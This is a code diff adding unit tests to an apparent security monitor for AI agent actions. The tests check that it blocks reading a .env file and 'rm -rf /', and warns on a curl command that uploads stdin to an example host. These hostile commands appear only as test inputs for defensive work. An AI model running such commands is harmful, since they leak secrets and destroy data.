@@ -146,6 +146,62 @@ test("blocks destructive cloud commands", () => {
   assert.equal(report.findings[0].category, "destructive_cloud");
 });
 
+test("blocks simulated OS open for sensitive files", () => {
+  const report = analyzeEvent(
+    {
+      type: "os",
+      text: "os open path=.env pid=1234 agent=demo mode=simulate",
+      source: "agent:demo:os"
+    },
+    defaultConfig
+  );
+
+  assert.equal(report.decision, "block");
+  assert.equal(report.findings[0].id, "os.sensitive-file-open");
+});
+
+test("allows simulated OS open for ordinary source files", () => {
+  const report = analyzeEvent(
+    {
+      type: "os",
+      text: "os open path=src/cli.js pid=1234 agent=demo mode=simulate",
+      source: "agent:demo:os"
+    },
+    defaultConfig
+  );
+
+  assert.equal(report.decision, "allow");
+  assert.equal(report.findings.length, 0);
+});
+
+test("warns on simulated OS network tool exec", () => {
+  const report = analyzeEvent(
+    {
+      type: "os",
+      text: "os exec argv=\"curl https://example.com/upload -d @-\" pid=1234 agent=demo mode=simulate",
+      source: "agent:demo:os"
+    },
+    defaultConfig
+  );
+
+  assert.equal(report.decision, "warn");
+  assert.equal(report.findings[0].id, "os.network-tool-exec");
+});
+
+test("blocks simulated OS destructive exec", () => {
+  const report = analyzeEvent(
+    {
+      type: "os",
+      text: "os exec argv=\"rm -rf /\" pid=1234 agent=demo mode=simulate",
+      source: "agent:demo:os"
+    },
+    defaultConfig
+  );
+
+  assert.equal(report.decision, "block");
+  assert.equal(report.findings[0].id, "os.destructive-exec");
+});
+
 test("redacts likely secrets", () => {
   const output = redactSecrets("OPENAI_API_KEY=sk-1234567890abcdefghijklmnop");
   assert.equal(output, "[REDACTED_SECRET]");
